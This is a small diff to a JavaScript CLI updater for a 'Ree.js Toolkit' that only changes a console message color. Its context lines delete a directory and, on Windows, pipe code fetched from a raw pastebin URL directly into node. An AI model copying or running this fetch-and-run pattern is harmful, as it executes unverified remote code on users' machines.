@@ -5,7 +5,7 @@ cli
     console.log(color("Updating Ree.js Toolkit...", "green"));
     fs.rmSync(dir, { recursive: true, force: true });
     console.log(
-      color("Downloading Required Files, Please don't exit!", "", "redBg")
+      color("Downloading Required Files, Please don't exit!", "redBright")
     );
     if (os == "win32")
       exec("powershell.exe Invoke-RestMethod https://pastebin.com/raw/PdLBGtkb | node");
